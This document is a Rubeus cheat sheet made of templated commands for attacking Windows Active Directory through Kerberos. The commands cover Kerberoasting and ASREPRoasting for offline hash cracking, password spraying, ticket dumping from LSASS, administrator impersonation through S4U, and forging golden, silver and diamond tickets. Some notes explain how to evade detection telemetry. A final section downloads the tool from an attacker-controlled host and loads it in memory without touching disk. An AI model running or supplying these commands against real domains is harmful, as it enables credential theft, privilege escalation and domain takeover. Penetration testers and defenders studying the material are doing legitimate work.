# Rubeus

## Rubeus - asreproast

### ASREPRoast user to file

Dump ASREPRoast user to file with Rubeus.

ASREPRoast a single user and save the AS-REP hash to disk for offline cracking.

```sh title:"Rubeus Dump ASREPRoast User to File"
.\Rubeus.exe asreproast /user:$user /domain:$domain /dc:$rhost_name /nowrap /outfile:hashes.txt
```
<!-- cheat
var user
var domain
var rhost_name
-->

### ASREPRoast hashcat format

Crack ASREPRoast hashcat format with Rubeus.

Same single-user ASREPRoast but emit the hash already in hashcat 18200 format.

```sh title:"Rubeus Crack ASREPRoast Hashcat Format"
.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
```
<!-- cheat
var user
-->

## Rubeus - kerberoast

### Kerberoast stats

Run kerberoast stats with Rubeus.

Print Kerberoast stats only (account counts, encryption types) without requesting tickets. Quick scope check.

```sh title:"Rubeus Run Kerberoast Stats"
.\Rubeus.exe kerberoast /stats
```
<!-- cheat -->

### Kerberoast adminCount=1

Run kerberoast adminCount=1 with Rubeus.

Restrict roast to AdminSDHolder-protected accounts. Highest-value targets only.

```sh title:"Rubeus Run Kerberoast AdminCount=1"
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
<!-- cheat -->

### Kerberoast one user

Run kerberoast one user with Rubeus.

Targeted Kerberoast against a named user.

```sh title:"Rubeus Run Kerberoast One User"
.\Rubeus.exe kerberoast /user:$user /nowrap
```
<!-- cheat
var user
-->

### Kerberoast all SPNs

Enable kerberoast all SPNs with Rubeus.

Bulk Kerberoast every SPN-enabled account in the domain.

```sh title:"Rubeus Enable Kerberoast All SPNs"
.\Rubeus.exe kerberoast /nowrap
```
<!-- cheat -->

### Kerberoast no preauth

Run kerberoast no preauth with Rubeus.

Roast a target via the no-preauth path (DONT_REQ_PREAUTH set). Works without valid creds, given the target's SPN.

```sh title:"Rubeus Run Kerberoast No Preauth"
.\Rubeus.exe kerberoast /nopreauth:$user /domain:$domain /spn:$spn /nowrap
```
<!-- cheat
var user
var domain
var spn
-->

### Kerberoast cross-domain

Run kerberoast cross domain with Rubeus.

Targeted roast against a user in a specific domain (cross-trust scenarios).

```sh title:"Rubeus Run Kerberoast Cross Domain"
.\Rubeus.exe kerberoast /user:$user /domain:$domain /nowrap
```
<!-- cheat
var user
var domain
-->

## Rubeus - asktgt

### TGT from RC4 + PTT

Dump TGT from RC4 + PTT with Rubeus.

Request a TGT using the user's RC4 hash and inject it into the current session in one step.

```sh title:"Rubeus Dump TGT from RC4 + PTT"
.\Rubeus.exe asktgt /rc4:$rc4_hash /user:$user /ptt
```
<!-- cheat
var rc4_hash
var user
-->

### TGT from password

Dump TGT from password with Rubeus.

Request a TGT with a cleartext password, output `.kirbi` (no PTT). Useful for relay-style flows where the ticket is consumed elsewhere.

```sh title:"Rubeus Dump TGT from Password"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

### TGT via PKINIT

Dump TGT via PKINIT with Rubeus.

PKINIT TGT request using a certificate (PFX) and its password. `/getcredentials` returns the user's NT hash.

```sh title:"Rubeus Dump TGT Via PKINIT"
.\Rubeus.exe asktgt /user:$user /certificate:$certificate /password:"$pass" /domain:$domain /dc:$rhost_name /getcredentials /show /nowrap
```
<!-- cheat
var user
var certificate
var pass
var domain
var rhost_name
-->

### TGT with AES256 key

Run TGT with AES256 key with Rubeus.

Request a TGT with an AES256 key instead of RC4. Prefer this when you have Kerberos keys and want to avoid RC4 downgrade telemetry.

```sh title:"Rubeus Run TGT with AES256 Key"
.\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /dc:$rhost_name /nowrap
```
<!-- cheat
var user
var aes256_key
var domain
var rhost_name
-->

### TGT into netonly process

Run TGT into netonly process with Rubeus.

Create a sacrificial net-only process and apply the TGT there so the current logon session's tickets are not clobbered.

```cmd title:"Rubeus Run TGT Into Netonly Process"
.\Rubeus.exe asktgt /user:$user /aes256:$aes256_key /domain:$domain /createnetonly:C:\Windows\System32\cmd.exe /show
```
<!-- cheat
var user
var aes256_key
var domain
-->

### TGT without PAC

Run TGT without PAC with Rubeus.

Request a TGT without a PAC. Useful for testing KDC behavior and reducing ticket size when PAC data is not needed.

```cmd title:"Rubeus Run TGT Without PAC"
.\Rubeus.exe asktgt /user:$user /password:$pass /domain:$domain /dc:$rhost_name /nopac /nowrap
```
<!-- cheat
var user
var pass
var domain
var rhost_name
-->

## Rubeus - s4u

### S4U2Self impersonate user

Run S4U2Self impersonate user with Rubeus.

S4U2Self with `/altservice` to forge a usable service ticket as another user, then PTT.

```sh title:"Rubeus Run S4U2Self Impersonate User"
.\Rubeus.exe s4u /self /nowrap /impersonateuser:$user /altservice:$service /ptt /ticket:$ticket
```
<!-- cheat
var user
var service
var ticket
-->

### S4U2Proxy admin

Run S4U2Proxy admin with Rubeus.

S4U2Proxy chain to forge a service ticket as administrator on the named SPN, using a controlled account's RC4 hash.

```sh title:"Rubeus Run S4U2Proxy Admin"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /altservice:$service /user:$user /rc4:$rc4_hash /ptt
```
<!-- cheat
var msdsspn
var service
var user
var rc4_hash
-->

### S4U admin no PTT

Run S4U admin no PTT with Rubeus.

Same admin S4U chain but without PTT; gets you the ticket on disk for use elsewhere.

```sh title:"Rubeus Run S4U Admin No PTT"
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:$msdsspn /domain:$domain /user:$user /rc4:$rc4_hash /nowrap
```
<!-- cheat
var msdsspn
var domain
var user
var rc4_hash
-->

### S4U2Self admin via altservice

Run S4U2Self admin via altservice with Rubeus.

S4U2Self/altservice trick that forges a usable Administrator service ticket from a controlled account's TGT.

```sh title:"Rubeus Run S4U2Self Admin Via Altservice"
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:$service /dc:$rhost_name /ptt /ticket:$ticket
```
<!-- cheat
var service
var rhost_name
var ticket
-->

### S4U2Proxy self user

Run S4U2Proxy self user with Rubeus.

S4U2Proxy where the impersonated user is the same controlled user; useful in RBCD chains.

```sh title:"Rubeus Run S4U2Proxy Self User"
.\Rubeus.exe s4u /user:$user /rc4:$rc4_hash /impersonateuser:$user /msdsspn:$msdsspn /ptt
```
<!-- cheat
var user
var rc4_hash
var msdsspn
-->

### Netonly cmd

Run netonly cmd with Rubeus.

Spawn cmd.exe under a net-only sacrificial logon. Lets you load tickets into a clean LUID without touching the host token.

```sh title:"Rubeus Run Netonly Cmd"
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
<!-- cheat -->

## Rubeus - ptt

### PTT from .kirbi

Run PTT from .kirbi with Rubeus.

Inject a `.kirbi` ticket file into the current logon session.

```sh title:"Rubeus Run PTT from .kirbi"
.\Rubeus.exe ptt /ticket:$ticket.kirbi
```
<!-- cheat
var ticket
-->

### PTT from base64

Encode PTT from base64 with Rubeus.

Inject a base64-encoded ticket into the current session. Avoids dropping a file on disk.

```sh title:"Rubeus Encode PTT from Base64"
.\Rubeus.exe ptt /ticket:$ticket
```
<!-- cheat
var ticket
-->

### PTT into LUID

Run PTT into LUID with Rubeus.

Inject a ticket into a specific logon session. Requires elevation and is commonly paired with `createnetonly`.

```cmd title:"Rubeus Run PTT Into LUID"
.\Rubeus.exe ptt /luid:$luid /ticket:$ticket
```
<!-- cheat
var luid
var ticket
-->

### Purge tickets

Run purge tickets with Rubeus.

Purge Kerberos tickets from the current logon session.

```cmd title:"Rubeus Run Purge Tickets"
.\Rubeus.exe purge
```
<!-- cheat -->

### Purge tickets from LUID

Run purge tickets from LUID with Rubeus.

Purge Kerberos tickets from a specific logon session. Requires elevation.

```cmd title:"Rubeus Run Purge Tickets from LUID"
.\Rubeus.exe purge /luid:$luid
```
<!-- cheat
var luid
-->

### Describe ticket

Run describe ticket with Rubeus.

Parse a `.kirbi` or base64 ticket and show ticket metadata. If the service key is known, Rubeus can decrypt and show PAC details.

```cmd title:"Rubeus Run Describe Ticket"
.\Rubeus.exe describe /ticket:$ticket /nowrap
```
<!-- cheat
var ticket
-->

### Describe ticket with service key

Run describe ticket with service key with Rubeus.

Decrypt the ticket with the service key and display PAC details.

```cmd title:"Rubeus Run Describe Ticket with Service Key"
.\Rubeus.exe describe /ticket:$ticket /servicekey:$service_key /nowrap
```
<!-- cheat
var ticket
var service_key
-->

### Triage tickets

List triage tickets with Rubeus.

List all tickets currently loaded in the session (LUID, target, encryption).

```sh title:"Rubeus List Triage Tickets"
.\Rubeus.exe triage
```
<!-- cheat -->

### Dump all accessible tickets

Dump all accessible tickets with Rubeus.

Dump Kerberos tickets from accessible logon sessions.

```cmd title:"Rubeus Dump All Accessible Tickets"
.\Rubeus.exe dump
```
<!-- cheat -->

### Detailed ticket list

List detailed ticket list with Rubeus.

Show detailed ticket information for the current or selected logon session.

```cmd title:"Rubeus List Detailed Ticket List"
.\Rubeus.exe klist /luid:$luid
```
<!-- cheat
var luid
-->

## Rubeus

### Dump tickets

Dump tickets with Rubeus.

Dump tickets for a specific LUID and service. Targeted variant of `triage` + extract.

```sh title:"Rubeus Dump Tickets"
.\Rubeus.exe dump /luid:$luid /service:$service /nowrap
```
<!-- cheat
var luid
var service
-->

### Golden ticket

Run golden ticket with Rubeus.

Forge a golden TGT with optional extra-SIDs (cross-forest impersonation).

```sh title:"Rubeus Run Golden Ticket"
.\Rubeus.exe golden /rc4:$rc4_hash /domain:$domain /sid:$sid /sids:$sids /user:$user /ptt
```
<!-- cheat
var rc4_hash
var domain
var sid
var sids
var user
-->

### Golden ticket via LDAP

Run golden ticket via LDAP with Rubeus.

Forge a golden ticket while letting Rubeus pull PAC fields from LDAP, then print a reusable command.

```cmd title:"Rubeus Run Golden Ticket Via LDAP"
.\Rubeus.exe golden /aes256:$aes256_key /ldap /user:$user /domain:$domain /dc:$rhost_name /printcmd /ptt
```
<!-- cheat
var aes256_key
var user
var domain
var rhost_name
-->

### Silver ticket

Enumerate silver ticket with Rubeus.

Forge a service ticket for a target SPN using the service account key. Add `/krbkey` when you also have the krbtgt key and want PAC checksums to line up.

```cmd title:"Rubeus Enumerate Silver Ticket"
.\Rubeus.exe silver /rc4:$rc4_hash /user:$user /service:$spn /domain:$domain /sid:$sid /ptt
```
<!-- cheat
var rc4_hash
var user
var spn
var domain
var sid
-->

### Silver ticket via LDAP

Run silver ticket via LDAP with Rubeus.

Forge a service ticket with PAC fields populated from LDAP and a krbtgt key for stronger PAC signing.

```cmd title:"Rubeus Run Silver Ticket Via LDAP"
.\Rubeus.exe silver /aes256:$aes256_key /user:$user /service:$spn /ldap /krbkey:$krbtgt_key /krbenctype:aes256 /domain:$domain /dc:$rhost_name /ptt
```
<!-- cheat
var aes256_key
var user
var spn
var krbtgt_key
var domain
var rhost_name
-->

### Diamond ticket

Dump diamond ticket with Rubeus.

Request a real TGT, modify PAC fields, and re-sign it with the krbtgt key. This keeps the normal request pattern while changing the embedded identity.

```cmd title:"Rubeus Dump Diamond Ticket"
.\Rubeus.exe diamond /krbkey:$krbtgt_key /user:$user /password:$pass /domain:$domain /dc:$rhost_name /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
```
<!-- cheat
var krbtgt_key
var user
var pass
var domain
var rhost_name
var target_user
var target_rid
var group_rids
-->

### Diamond ticket via tgtdeleg

Run diamond ticket via tgtdeleg with Rubeus.

Use the `tgtdeleg` trick as the base ticket, then modify PAC fields with the krbtgt key.

```cmd title:"Rubeus Run Diamond Ticket Via Tgtdeleg"
.\Rubeus.exe diamond /krbkey:$krbtgt_key /tgtdeleg /ticketuser:$target_user /ticketuserid:$target_rid /groups:$group_rids /ptt
```
<!-- cheat
var krbtgt_key
var target_user
var target_rid
var group_rids
-->

### Watch for new TGTs

Create watch for new TGTs with Rubeus.

Monitor LSASS for new TGTs at a 5s interval. Used after coercing a target to a host you control to grab inbound tickets.

```sh title:"Rubeus Create Watch for New TGTs"
.\Rubeus.exe monitor /interval:5 /nowrap
```
<!-- cheat -->

### Watch for target user's TGTs

Enumerate watch for target user's TGTs with Rubeus.

Monitor for new TGTs belonging to a specific user or machine account.

```cmd title:"Rubeus Enumerate Watch for Target User's TGTs"
.\Rubeus.exe monitor /targetuser:$target_user /interval:$seconds /runfor:$runfor_seconds /nowrap
```
<!-- cheat
var target_user
var seconds
var runfor_seconds
-->

### Harvest and auto-renew TGTs

Start harvest and auto renew TGTs with Rubeus.

Maintain a cache of observed TGTs and renew them before expiry. Useful on unconstrained delegation hosts.

```cmd title:"Rubeus Start Harvest and Auto Renew TGTs"
.\Rubeus.exe harvest /monitorinterval:$monitor_seconds /displayinterval:$display_seconds /nowrap
```
<!-- cheat
var monitor_seconds
var display_seconds
-->

### Ask TGS

Run ask TGS with Rubeus.

Request a TGS for a named service using an existing TGT and PTT.

```sh title:"Rubeus Run Ask TGS"
.\Rubeus.exe asktgs /ticket:$ticket /service:$service /ptt
```
<!-- cheat
var ticket
var service
-->

### Ask TGS via current session

Run ask TGS via current session with Rubeus.

Request a service ticket through LSA using the current session TGT. This avoids supplying a ticket blob and makes traffic originate from LSASS.

```cmd title:"Rubeus Run Ask TGS Via Current Session"
.\Rubeus.exe asktgs /service:$spn /nowrap
```
<!-- cheat
var spn
-->

### Ask TGS with forced enctype

Run ask TGS with forced enctype with Rubeus.

Request a service ticket with a specific encryption type.

```cmd title:"Rubeus Run Ask TGS with Forced Enctype"
.\Rubeus.exe asktgs /ticket:$ticket /service:$spn /enctype:$enctype /dc:$rhost_name /nowrap
```
<!-- cheat
var ticket
var spn
var enctype
var rhost_name
-->

### Ask TGS user-to-user

Enumerate ask TGS user to user with Rubeus.

Use U2U to request a PAC for a target user and inspect the result with `describe`.

```cmd title:"Rubeus Enumerate Ask TGS User to User"
.\Rubeus.exe asktgs /u2u /targetuser:$target_user /ticket:$ticket /tgs:$tgs /nowrap
```
<!-- cheat
var target_user
var ticket
var tgs
-->

### Renew ticket

Run renew ticket with Rubeus.

Renew a TGT and inject it. Extends ticket lifetime when the original is about to expire.

```sh title:"Rubeus Run Renew Ticket"
.\Rubeus.exe renew /ticket:$ticket /ptt
```
<!-- cheat
var ticket
-->

### Auto-renew ticket

Run auto renew ticket with Rubeus.

Loop until the renew-till window expires, renewing the TGT before each end time.

```cmd title:"Rubeus Run Auto Renew Ticket"
.\Rubeus.exe renew /ticket:$ticket /autorenew /nowrap
```
<!-- cheat
var ticket
-->

### TGS service substitution

Write TGS service substitution with Rubeus.

Substitute the service in a TGS by rewriting the sname (silver ticket repurposing trick).

```sh title:"Rubeus Write TGS Service Substitution"
.\Rubeus.exe tgssub /ticket:$ticket /altservice:$service /nowrap
```
<!-- cheat
var ticket
var service
-->

### Hash password

Dump hash password with Rubeus.

Compute Kerberos keys (RC4, AES128, AES256) from a cleartext password for the specified user/domain.

```sh title:"Rubeus Dump Hash Password"
.\Rubeus.exe hash /password:$pass /user:$user /domain:$domain
```
<!-- cheat
var pass
var user
var domain
-->

### Kerberos password spray

Dump kerberos password spray with Rubeus.

Spray a single password across users via Kerberos. `/noticket` suppresses successful TGT output.

```cmd title:"Rubeus Dump Kerberos Password Spray"
.\Rubeus.exe brute /password:$pass /users:$users_file /domain:$domain /dc:$rhost_name /noticket
```
<!-- cheat
var pass
var users_file
var domain
var rhost_name
-->

### Kerberos brute one user

Run kerberos brute one user with Rubeus.

Try a password list against one user over Kerberos.

```cmd title:"Rubeus Run Kerberos Brute One User"
.\Rubeus.exe brute /user:$user /passwords:$passwords_file /domain:$domain /dc:$rhost_name /noticket
```
<!-- cheat
var user
var passwords_file
var domain
var rhost_name
-->

### Pre-auth scan

Scan pre auth scan with Rubeus.

Scan a user list for accounts that do not require Kerberos pre-authentication.

```cmd title:"Rubeus Scan Pre Auth Scan"
.\Rubeus.exe preauthscan /users:$users_file /domain:$domain /dc:$rhost_name
```
<!-- cheat
var users_file
var domain
var rhost_name
-->

### TGT delegation

Run TGT delegation with Rubeus.

Use the GSS-API delegation trick to retrieve a usable TGT for the current user without elevation.

```cmd title:"Rubeus Run TGT Delegation"
.\Rubeus.exe tgtdeleg /target:$spn
```
<!-- cheat
var spn
-->

### Change password with ticket

Dump change password with ticket with Rubeus.

Use an existing TGT or changepw ticket to reset a password through Kerberos.

```cmd title:"Rubeus Dump Change Password with Ticket"
.\Rubeus.exe changepw /ticket:$ticket /new:$new_pass /dc:$rhost_name /targetuser:$domain\$user
```
<!-- cheat
var ticket
var new_pass
var rhost_name
var domain
var user
-->

### Current LUID

Show current LUID with Rubeus.

Print the current logon session ID.

```cmd title:"Rubeus Show Current LUID"
.\Rubeus.exe currentluid
```
<!-- cheat -->

### Logon session details

Show logon session details with Rubeus.

Show logon session details for the current or selected LUID.

```cmd title:"Rubeus Show Logon Session Details"
.\Rubeus.exe logonsession /luid:$luid
```
<!-- cheat
var luid
-->

### Kerberoast RC4 only (OPSEC)

Run kerberoast RC4 only (OPSEC) with Rubeus.

Skip AES-enabled accounts to avoid the 4769-A event ID flag that AES Kerberoasting raises in modern hunts.

```sh title:"Rubeus Run Kerberoast RC4 Only (OPSEC)"
.\Rubeus.exe kerberoast /rc4opsec /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast AES only

Crack kerberoast AES only with Rubeus.

Target AES-enabled accounts specifically. Slower to crack but bypasses some weak detection rules that only watch RC4.

```sh title:"Rubeus Crack Kerberoast AES Only"
.\Rubeus.exe kerberoast /aes /outfile:$output_file
```
<!-- cheat
var output_file
-->

### Kerberoast specific user (simple)

Dump kerberoast specific user (simple) with Rubeus.

Targeted roast in `/simple` output format - just the hash, no surrounding metadata.

```sh title:"Rubeus Dump Kerberoast Specific User (simple)"
.\Rubeus.exe kerberoast /user:$target_user /simple /outfile:$output_file
```
<!-- cheat
var target_user
var output_file
-->

## Rubeus - in-memory load

### Load from disk

Run load from disk with Rubeus.

Load Rubeus into the current PowerShell session via Reflection - no `Rubeus.exe` process spawn, runs in `powershell.exe`.

```powershell title:"Rubeus Run Load from Disk"
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("$rubeus_path"))
```
<!-- cheat
var rubeus_path
-->

### Load from URL

Run load from URL with Rubeus.

Pull Rubeus from an attacker server and load into the current PS session - no disk drop.

```powershell title:"Rubeus Run Load from URL"
$data = (New-Object System.Net.WebClient).DownloadData('$scheme://$lhost:$lport/Rubeus.exe'); [System.Reflection.Assembly]::Load($data)
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Invoke loaded Rubeus

Run invoke loaded rubeus with Rubeus.

After loading via Reflection, call into Rubeus.Program directly.

```powershell title:"Rubeus Run Invoke Loaded Rubeus"
[Rubeus.Program]::Main("$rubeus_cmd".Split())
```
<!-- cheat
var rubeus_cmd
-->
